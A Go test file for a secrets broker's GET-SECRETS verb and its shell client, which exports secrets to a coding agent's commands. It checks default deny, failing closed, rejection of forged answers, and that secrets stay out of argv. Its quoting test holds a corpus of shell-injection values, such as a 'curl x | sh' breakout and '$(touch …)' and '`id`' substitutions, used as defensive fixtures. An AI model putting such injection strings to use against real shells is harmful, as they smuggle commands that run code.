package broker

// GET-SECRETS (design §10.3) and its in-container client, drydock-secrets,
// tested the way the other clients are (testing §6.6): the real script, a real
// shell, a real broker socket, both transports.

import (
	"bytes"
	"context"
	"crypto/rand"
	"fmt"
	mrand "math/rand/v2"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/krelinga/drydock/internal/secrets"
)

func secretsKey(t *testing.T) *secrets.Key {
	t.Helper()
	raw := make([]byte, secrets.KeySize)
	rand.Read(raw)
	k, err := secrets.NewKey(raw)
	if err != nil {
		t.Fatal(err)
	}
	return k
}

// grant stores a secret and grants it to the given repositories.
func (e *env) grant(t *testing.T, name, value string, repos ...int64) {
	t.Helper()
	ctx := context.Background()
	if _, err := e.sec.Put(ctx, name, value, "reaches a scratch service", ""); err != nil {
		t.Fatalf("Put %s: %v", name, err)
	}
	if _, err := e.sec.SetGrants(ctx, name, repos, false); err != nil {
		t.Fatal(err)
	}
}

// shell runs script under the given shell with the client environment: the
// scripts first on PATH, this workspace's socket, the forced transport.
func (e *env) shell(t *testing.T, sock, transport, shell, script string, extraEnv ...string) run {
	t.Helper()
	return runShell(t, sock, transport, shell, script, extraEnv...)
}

func runShell(t *testing.T, sock, transport, shell, script string, extraEnv ...string) run {
	t.Helper()
	cmd := exec.Command(shell, "-c", script)
	cmd.Env = append([]string{
		"PATH=" + binDir + ":" + os.Getenv("PATH"),
		"DRYDOCK_BROKER_SOCK=" + sock,
		"DRYDOCK_BROKER_TRANSPORT=" + transport,
	}, extraEnv...)
	var out, errb bytes.Buffer
	cmd.Stdout, cmd.Stderr = &out, &errb
	err := cmd.Run()
	code := 0
	if ee, ok := err.(*exec.ExitError); ok {
		code = ee.ExitCode()
	} else if err != nil {
		t.Fatal(err)
	}
	return run{out.String(), errb.String(), code}
}

// The prelude Claude Code runs, verbatim from the Feature
// (TestEnvFileIsOneConstantLine holds the two together). The `|| echo exit
// 69` is for a helper that cannot run at all: see
// TestPreludeFailsClosedWithoutTheHelper.
const prelude = `eval "$(drydock-secrets export || echo exit 69)"`

var shells = func() []string {
	var out []string
	for _, s := range []string{"dash", "bash"} {
		if p, err := exec.LookPath(s); err == nil {
			out = append(out, p)
		}
	}
	return out
}()

// ---- the verb ---------------------------------------------------------------

// Default deny, over the wire: the granted workspace receives the secret in
// the documented framing, the ungranted one an empty set — and both are
// answers, not errors.
func TestGetSecretsDefaultDeny(t *testing.T) {
	e := newEnv(t)
	if got := e.ask(t, wsA, "GET-SECRETS"); got != "OK count=0" {
		t.Errorf("nothing stored: %q", got)
	}
	e.grant(t, "TEST_DATABASE_URL", "postgres://u:p@db/x", 101)
	e.grant(t, "B_SECOND", "it's two words", 101)

	full := func(ws string) string {
		conn, err := net.Dial("unix", e.b.SocketPath(ws))
		if err != nil {
			t.Fatal(err)
		}
		defer conn.Close()
		conn.Write([]byte("GET-SECRETS\n"))
		var b bytes.Buffer
		b.ReadFrom(conn)
		return b.String()
	}
	if got, want := full(wsA), "OK count=2\nB_SECOND it's two words\nTEST_DATABASE_URL postgres://u:p@db/x\nEND\n"; got != want {
		t.Errorf("granted workspace got %q, want %q", got, want)
	}
	if got := full(wsB); got != "OK count=0\nEND\n" {
		t.Errorf("ungranted workspace got %q", got)
	}
	// One secret_access row per secret per fetch, for the workspace that
	// fetched; none for the one that received nothing.
	full(wsA)
	var a, b int
	e.db.QueryRow(`SELECT count(*) FROM secret_access WHERE workspace_id = ?`, wsA).Scan(&a)
	e.db.QueryRow(`SELECT count(*) FROM secret_access WHERE workspace_id = ?`, wsB).Scan(&b)
	if a != 4 || b != 0 {
		t.Errorf("secret_access: %d rows for A (want 4: two fetches of two), %d for B", a, b)
	}
}

// The broker is cheap per call: N fetches decrypt nothing and ask GitHub
// nothing (testing §8.2). Control: each one still carries the value, and a
// rotation reaches the next one.
func TestGetSecretsIsCheapPerCall(t *testing.T) {
	e := newEnv(t)
	e.grant(t, "TEST_KEY", "k1", 101)
	e.ask(t, wsA, "GET-SECRETS")
	decrypts, requests := e.sec.Decrypts(), e.fake.Count("")
	for i := 0; i < 50; i++ {
		if r := e.client(t, wsA, "socat", "", os.Getenv("PATH"), "drydock-secrets", "export"); r.stdout != "export TEST_KEY='k1'\n" {
			t.Fatalf("fetch %d: %+v", i, r)
		}
	}
	if d := e.sec.Decrypts() - decrypts; d != 0 {
		t.Errorf("50 fetches made %d decryptions", d)
	}
	if n := e.fake.Count("") - requests; n != 0 {
		t.Errorf("50 fetches made %d GitHub requests", n)
	}
	e.grant(t, "TEST_KEY", "k2", 101)
	if r := e.client(t, wsA, "socat", "", os.Getenv("PATH"), "drydock-secrets", "export"); r.stdout != "export TEST_KEY='k2'\n" {
		t.Errorf("after rotation: %+v", r)
	}
}

// A workspace being deleted, or one that no longer exists, gets nothing — as
// with tokens. An undeliverable store is an error, not an empty set. And with
// no master key configured there are no secrets, which is an empty answer.
func TestGetSecretsRefusals(t *testing.T) {
	e := newEnv(t)
	e.grant(t, "TEST_KEY", "k1", 101, 202)
	if got := e.ask(t, wsA, "GET-SECRETS"); got != "OK count=1" {
		t.Fatalf("control: %q", got)
	}
	e.db.Exec(`UPDATE workspace SET state = 'deleting' WHERE id = ?`, wsA)
	if got := e.ask(t, wsA, "GET-SECRETS"); got != "ERR reason=revoked" {
		t.Errorf("deleting: %q", got)
	}
	e.db.Exec(`DELETE FROM workspace WHERE id = ?`, wsA)
	if got := e.ask(t, wsA, "GET-SECRETS"); got != "ERR reason=revoked" {
		t.Errorf("gone: %q", got)
	}
	// Archived still gets its secrets: the grant is the operator's, not
	// GitHub's.
	e.db.Exec(`UPDATE repository SET archived = 1 WHERE id = 202`)
	if got := e.ask(t, wsB, "GET-SECRETS"); got != "OK count=1" {
		t.Errorf("archived: %q", got)
	}
	// A row the write path would refuse fails the fetch rather than being
	// sent, for every workspace.
	e.db.Exec(`UPDATE secret SET name = 'GH_TOKEN'`)
	e.sec.Put(context.Background(), "OTHER", "v", "r", "") // invalidates the snapshot
	if got := e.ask(t, wsB, "GET-SECRETS"); got != "ERR reason=unavailable" {
		t.Errorf("a reserved name in storage: %q", got)
	}

	plain := newEnv(t)
	plain.b.Secrets = nil
	// The broker reads Secrets per request; nothing else is in flight here.
	if got := plain.ask(t, wsA, "GET-SECRETS"); got != "OK count=0" {
		t.Errorf("no store: %q", got)
	}
}

// ---- the client: quoting ----------------------------------------------------------

// hostile is the shell-metacharacter corpus (testing §8.2, §15.2), plus
// values that look like the protocol itself.
var hostile = []string{
	"'", "''", "'; curl x | sh; '", "'; touch {{PWNED}}; '", "$(touch {{PWNED}})", "`touch {{PWNED}}`",
	"$(id)", "`id`", `\`, `\'`, `\\'`, `'\''`, `'"'"'`, `"`, `""`, `$'\x41'`, "${HOME}", "$HOME",
	"a b  c", " leading", "trailing ", "   ", "*", "?", "[a]", "~", "~root", "#not a comment", "!", "!!",
	"&&", "||", "|", ";", "<", ">", ">{{PWNED}}", "a=b", "--", "-n", "-e", "%s%n%d", "END", "OK count=9",
	"export GH_TOKEN=x", "GH_TOKEN ghs_x", "ünïcödé 漢字 🙂", "\u2028", "\ufeff", "\u00a0", "Z\u0301",
	"postgres://u:p@h:5432/d?sslmode=disable&x=$y",
}

// alphabet is what the random values are drawn from: everything the shell
// treats specially, plus multi-byte text. Control characters are refused at
// write (§10.1) and so are not in it.
var alphabet = []rune("abcXYZ019 '\"\\$`;|&*?[]{}()<>~#!=%^,.:/-_+@\u00e9\u6f22\U0001F642\u2028\ufeff")

func randomValue(r *mrand.Rand) string {
	n := 1 + r.IntN(48)
	b := make([]rune, n)
	for i := range b {
		b[i] = alphabet[r.IntN(len(alphabet))]
	}
	return string(b)
}

// TestExportRoundTripsArbitraryValues is testing §15.2's property test: for
// arbitrary values that pass validation, `eval "$(drydock-secrets export)"`
// in a real shell leaves each variable byte-identical to what was stored,
// and runs none of it. Over both transports, in dash and bash.
func TestExportRoundTripsArbitraryValues(t *testing.T) {
	seed := uint64(time.Now().UnixNano())
	t.Logf("seed %d", seed)
	r := mrand.New(mrand.NewPCG(seed, 0x5eed))
	pwnDir := t.TempDir()
	pwned := filepath.Join(pwnDir, "pwned")

	var values []string
	for _, v := range hostile {
		values = append(values, strings.ReplaceAll(v, "{{PWNED}}", pwned))
	}
	for len(values) < 400 {
		if v := randomValue(r); secrets.ValidateValue(v) == nil {
			values = append(values, v)
		}
	}
	for _, v := range values {
		if err := secrets.ValidateValue(v); err != nil {
			t.Fatalf("corpus value %q fails validation: %v", v, err)
		}
	}

	const batch = 40
	for _, tr := range transports {
		for _, sh := range shells {
			t.Run(tr+"/"+filepath.Base(sh), func(t *testing.T) {
				e := newEnv(t)
				ctx := context.Background()
				for i := 0; i < batch; i++ {
					name := fmt.Sprintf("V_%02d", i)
					e.sec.Put(ctx, name, "seed", "r", "")
					e.sec.SetGrants(ctx, name, []int64{101}, false)
				}
				for start := 0; start < len(values); start += batch {
					var refs []string
					want := map[string]string{}
					for i := 0; i < batch && start+i < len(values); i++ {
						name := fmt.Sprintf("V_%02d", i)
						if _, err := e.sec.Put(ctx, name, values[start+i], "r", ""); err != nil {
							t.Fatal(err)
						}
						want[name] = values[start+i]
						refs = append(refs, `"$`+name+`"`)
					}
					// Each variable, NUL-terminated, exactly as the shell holds it.
					res := e.shell(t, e.b.SocketPath(wsA), tr, sh,
						prelude+"\nprintf '%s\\0' "+strings.Join(refs, " "), "LC_ALL=C.UTF-8")
					if res.code != 0 || res.stderr != "" {
						t.Fatalf("exit %d, stderr %q", res.code, res.stderr)
					}
					got := strings.Split(strings.TrimSuffix(res.stdout, "\x00"), "\x00")
					if len(got) != len(refs) {
						t.Fatalf("%d values back for %d sent", len(got), len(refs))
					}
					for i := range got {
						name := fmt.Sprintf("V_%02d", i)
						if got[i] != want[name] {
							t.Errorf("%s: stored %q, the shell holds %q", name, want[name], got[i])
						}
					}
				}
				if _, err := os.Stat(pwned); err == nil {
					t.Fatal("a value executed: " + pwned + " exists")
				}
			})
		}
	}
}

// ---- the client: silence and failure -------------------------------------------------

// Silent on success: the prelude writes zero bytes to stdout and stderr
// (Spike 03 — both are prepended to every result the agent reads). Control:
// the variable is nonetheless exported into the command's environment.
func TestExportIsSilentOnSuccess(t *testing.T) {
	for _, tr := range transports {
		t.Run(tr, func(t *testing.T) {
			e := newEnv(t)
			e.grant(t, "TEST_KEY", "k 1", 101)
			if r := e.shell(t, e.b.SocketPath(wsA), tr, "sh", prelude); r.code != 0 || r.stdout != "" || r.stderr != "" {
				t.Errorf("the prelude alone: exit %d, stdout %q, stderr %q; want 0 and zero bytes", r.code, r.stdout, r.stderr)
			}
			if r := e.shell(t, e.b.SocketPath(wsA), tr, "sh", prelude+"\nenv"); !strings.Contains(r.stdout, "TEST_KEY=k 1\n") {
				t.Errorf("control: a child's environment lacks the secret: %+v", r)
			}
			// And an ungranted workspace: silent too, and without it.
			if r := e.shell(t, e.b.SocketPath(wsB), tr, "sh", prelude+"\nenv"); r.code != 0 || r.stderr != "" || strings.Contains(r.stdout, "TEST_KEY") {
				t.Errorf("ungranted: %+v", r)
			}
		})
	}
}

// Fail closed: with the broker unreachable or refusing, the prelude ends
// the command shell with 69 and one line on stderr, so the command after it
// never runs — even though `eval` of a failed substitution would otherwise
// succeed. Control: with the broker up, the same command runs.
func TestExportFailsClosed(t *testing.T) {
	e := newEnv(t)
	e.grant(t, "TEST_KEY", "k1", 101)
	const cmd = prelude + "\necho ran"
	for _, sh := range shells {
		if r := e.shell(t, e.b.SocketPath(wsA), "socat", sh, cmd); r.code != 0 || r.stdout != "ran\n" {
			t.Fatalf("control (%s): %+v", sh, r)
		}
	}
	check := func(what, sock, wantErr string) {
		t.Helper()
		for _, sh := range shells {
			r := e.shell(t, sock, "socat", sh, cmd)
			if r.code != 69 || strings.Contains(r.stdout, "ran") {
				t.Errorf("%s (%s): exit %d, stdout %q; want 69 and the command not run", what, sh, r.code, r.stdout)
			}
			if lines := strings.Count(r.stderr, "\n"); lines != 1 || !strings.Contains(r.stderr, wantErr) {
				t.Errorf("%s (%s): stderr %q; want one line containing %q", what, sh, r.stderr, wantErr)
			}
		}
	}
	e.db.Exec(`UPDATE workspace SET state = 'deleting' WHERE id = ?`, wsA)
	check("refused", e.b.SocketPath(wsA), "drydock: secrets unavailable (revoked)")
	e.b.Close(wsB)
	check("socket gone", e.b.SocketPath(wsB), "drydock: secrets unavailable: no broker socket")
}

// Fail closed when the helper cannot run at all — gone from PATH, or there
// but not executable. Its own `exit 69` cannot help then: it prints nothing,
// `eval` of the empty substitution succeeds, and a bare
// `eval "$(drydock-secrets export)"` lets the command run without its
// secrets. The env file's `|| echo exit 69` is what closes that. Asserted on
// the command, by a marker it would create, not on any exit status. Control:
// with the helper in place and the broker answering, the same text runs the
// command, and the command sees its secret.
func TestPreludeFailsClosedWithoutTheHelper(t *testing.T) {
	text, err := os.ReadFile(filepath.Join(binDir, "..", "etc", "claude-env.sh"))
	if err != nil {
		t.Fatal(err)
	}
	line := strings.TrimSpace(string(text))
	e := newEnv(t)
	e.grant(t, "TEST_KEY", "k1", 101)

	// A PATH with no drydock-secrets anywhere on it but the one under test.
	var rest []string
	for _, d := range filepath.SplitList(os.Getenv("PATH")) {
		if _, err := os.Stat(filepath.Join(d, "drydock-secrets")); err != nil {
			rest = append(rest, d)
		}
	}
	// bins builds a copy of the Feature's clients with drydock-secrets as
	// mode says: "ok" as shipped, "missing", or "noexec" (0644).
	bins := func(mode string) string {
		dir := t.TempDir()
		ents, err := os.ReadDir(binDir)
		if err != nil {
			t.Fatal(err)
		}
		for _, ent := range ents {
			if ent.Name() == "drydock-secrets" && mode == "missing" {
				continue
			}
			b, err := os.ReadFile(filepath.Join(binDir, ent.Name()))
			if err != nil {
				t.Fatal(err)
			}
			perm := os.FileMode(0o755)
			if ent.Name() == "drydock-secrets" && mode == "noexec" {
				perm = 0o644
			}
			if err := os.WriteFile(filepath.Join(dir, ent.Name()), b, perm); err != nil {
				t.Fatal(err)
			}
		}
		return dir
	}
	// Both ways Claude Code might join the prelude to a command (Spike 03
	// observed `&&`), in every shell present.
	runs := func(mode, sh, join string) (ran bool, out string) {
		marker := filepath.Join(t.TempDir(), "ran")
		cmd := exec.Command(sh, "-c", line+join+`printf %s "$TEST_KEY" >`+marker)
		cmd.Env = []string{
			"PATH=" + strings.Join(append([]string{bins(mode)}, rest...), string(filepath.ListSeparator)),
			"DRYDOCK_BROKER_SOCK=" + e.b.SocketPath(wsA),
			"DRYDOCK_BROKER_TRANSPORT=socat",
		}
		o, _ := cmd.CombinedOutput()
		got, err := os.ReadFile(marker)
		if err != nil {
			return false, string(o)
		}
		return true, string(got)
	}
	for _, sh := range shells {
		for _, join := range []string{"\n", " && ", "; "} {
			if ran, got := runs("ok", sh, join); !ran || got != "k1" {
				t.Fatalf("control (%s, %q): ran %v, saw %q; want the command run with its secret", sh, join, ran, got)
			}
			for _, mode := range []string{"missing", "noexec"} {
				if ran, out := runs(mode, sh, join); ran {
					t.Errorf("helper %s (%s, %q): the command ran without its secrets (output %q)", mode, sh, join, out)
				}
			}
		}
	}
}

// standIn answers every connection on a fresh socket with the given bytes —
// a broker that lies, for the client's own checks.
func standIn(t *testing.T, answer string) string {
	t.Helper()
	dir := shortDir(t)
	os.MkdirAll(dir, 0o700)
	sock := filepath.Join(dir, "s.sock")
	ln, err := net.Listen("unix", sock)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { ln.Close() })
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go func() {
				defer c.Close()
				buf := make([]byte, 256)
				c.Read(buf)
				c.Write([]byte(answer))
			}()
		}
	}()
	return sock
}

// The forged-line attack (testing §15.1), with the write-time check bypassed
// by a broker that sends what it likes: the client fails the fetch whenever
// the framing is off — a count that disagrees, no END, a line past END, a
// malformed name — and delivers nothing, GH_TOKEN least of all. Control: a
// well-formed answer delivers all three of its secrets.
func TestExportRefusesAForgedAnswer(t *testing.T) {
	const cmd = prelude + "\necho ran\nenv"
	for _, tr := range transports {
		t.Run(tr, func(t *testing.T) {
			ok := runShell(t, standIn(t, "OK count=3\nA_ONE 1\nB_TWO it's 2\nC_THREE x y\nEND\n"), tr, "sh", cmd)
			if ok.code != 0 || ok.stderr != "" || !strings.Contains(ok.stdout, "ran\n") ||
				!strings.Contains(ok.stdout, "A_ONE=1\n") || !strings.Contains(ok.stdout, "B_TWO=it's 2\n") || !strings.Contains(ok.stdout, "C_THREE=x y\n") {
				t.Fatalf("control: a well-formed answer: %+v", ok)
			}
			for name, answer := range map[string]string{
				"a forged line":       "OK count=1\nTEST_KEY hunter2\nGH_TOKEN ghp_forged\nEND\n",
				"fewer than count":    "OK count=2\nTEST_KEY hunter2\nEND\n",
				"no END":              "OK count=1\nTEST_KEY hunter2\n",
				"only the header":     "OK count=0\n",
				"past END":            "OK count=1\nTEST_KEY hunter2\nEND\nGH_TOKEN ghp_forged\n",
				"a lowercase name":    "OK count=1\ngh_token ghp_forged\nEND\n",
				"a name with =":       "OK count=1\nA=B ghp_forged\nEND\n",
				"a name with $":       "OK count=1\nA$(id) x\nEND\n",
				"no value separator":  "OK count=1\nGH_TOKEN\nEND\n",
				"a bad count":         "OK count=1x\nEND\n",
				"a negative count":    "OK count=-1\nEND\n",
				"a token answer":      "OK token=ghs_x expires_at=2030-01-01T00:00:00Z\n",
				"an error":            "ERR reason=unavailable\n",
				"nothing":             "",
				"garbage":             "HTTP/1.1 200 OK\n",
				"a blank line inside": "OK count=1\n\nTEST_KEY x\nEND\n",
			} {
				r := runShell(t, standIn(t, answer), tr, "sh", cmd)
				if r.code != 69 || strings.Contains(r.stdout, "ran") || strings.Contains(r.stdout, "ghp_forged") {
					t.Errorf("%s: exit %d, stdout %q; want 69 and nothing delivered", name, r.code, r.stdout)
				}
				if strings.Count(r.stderr, "\n") != 1 || !strings.Contains(r.stderr, "secrets unavailable") {
					t.Errorf("%s: stderr %q; want one line", name, r.stderr)
				}
			}
		})
	}
}

// ---- argv ----------------------------------------------------------------------

// Values stay out of argv (testing §4.2, §8.2): every process's cmdline is
// recorded twice — by stand-in socat and nc that sweep /proc while the fetch
// is in flight, and by the command after the prelude — and the canary is in
// none of them. Controls: the prelude's own text, which Claude Code passes
// as argv, is found by the same sweep; and the canary is in the command's
// environment.
func TestValuesStayOutOfArgv(t *testing.T) {
	canary := "Kq8zR2vNw5xLp7Tj4Ys9" + "-argv-canary"
	for _, tr := range transports {
		t.Run(tr, func(t *testing.T) {
			e := newEnv(t)
			e.grant(t, "TEST_KEY", "postgres://u:"+canary+"@db/x", 101)
			real, err := exec.LookPath(map[string]string{"socat": "socat", "nc": "nc"}[tr])
			if err != nil {
				// A skip in CI would be a silent pass of the one test that
				// sweeps argv for a secret, so CI sets the guard.
				if os.Getenv("DRYDOCK_REQUIRE_TRANSPORTS") != "" {
					t.Fatalf("%s is not installed, and DRYDOCK_REQUIRE_TRANSPORTS is set", tr)
				}
				t.Skip(tr + " is not installed")
			}
			wrap := t.TempDir()
			log := filepath.Join(t.TempDir(), "cmdlines")
			os.WriteFile(filepath.Join(wrap, tr), []byte(fmt.Sprintf(`#!/bin/sh
for p in /proc/[0-9]*; do tr '\0' ' ' <"$p/cmdline" 2>/dev/null; echo; done >>%q
exec %q "$@"
`, log, real)), 0o755)
			sweep := fmt.Sprintf(`for p in /proc/[0-9]*; do tr '\0' ' ' <"$p/cmdline" 2>/dev/null; echo; done >>%q`, log)
			cmd := exec.Command("bash", "-c", prelude+" && "+sweep+" && env")
			cmd.Env = []string{
				"PATH=" + binDir + ":" + wrap + ":" + os.Getenv("PATH"),
				"DRYDOCK_BROKER_SOCK=" + e.b.SocketPath(wsA),
				"DRYDOCK_BROKER_TRANSPORT=" + tr,
			}
			out, err := cmd.CombinedOutput()
			if err != nil {
				t.Fatalf("%v: %s", err, out)
			}
			if !strings.Contains(string(out), canary) {
				t.Fatal("control: the command's environment lacks the secret")
			}
			swept, _ := os.ReadFile(log)
			if !strings.Contains(string(swept), tr+" ") || !strings.Contains(string(swept), "drydock-secrets export") {
				t.Fatalf("control: the sweep did not see the transport or the prelude's text:\n%s", swept)
			}
			if strings.Contains(string(swept), canary) {
				t.Errorf("the value is in some process's argv:\n%s", swept)
			}
		})
	}
}

// ---- the env file ------------------------------------------------------------------

// The CLAUDE_ENV_FILE script is one constant line (Spike 03): its text is read
// once per session and passed as argv on every command, so it delegates to
// the helper and holds no value. Control: run as Claude Code runs it, it
// delivers a secret — and, unchanged, delivers the rotated one next time.
func TestEnvFileIsOneConstantLine(t *testing.T) {
	path := filepath.Join(binDir, "..", "etc", "claude-env.sh")
	text, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if string(text) != prelude+"\n" {
		t.Fatalf("%s is %q; want exactly %q", path, text, prelude+"\n")
	}
	e := newEnv(t)
	e.grant(t, "TEST_KEY", "first", 101)
	read := func() string {
		// Claude Code trims the text and prepends it to the command (Spike 03).
		r := e.shell(t, e.b.SocketPath(wsA), "socat", "bash", strings.TrimSpace(string(text))+" && printf %s \"$TEST_KEY\"")
		if r.code != 0 || r.stderr != "" {
			t.Fatalf("%+v", r)
		}
		return r.stdout
	}
	if got := read(); got != "first" {
		t.Errorf("got %q", got)
	}
	e.grant(t, "TEST_KEY", "second", 101)
	after, _ := os.ReadFile(path)
	if got := read(); got != "second" || !bytes.Equal(after, text) {
		t.Errorf("after rotation got %q; the file changed: %v", got, !bytes.Equal(after, text))
	}
}
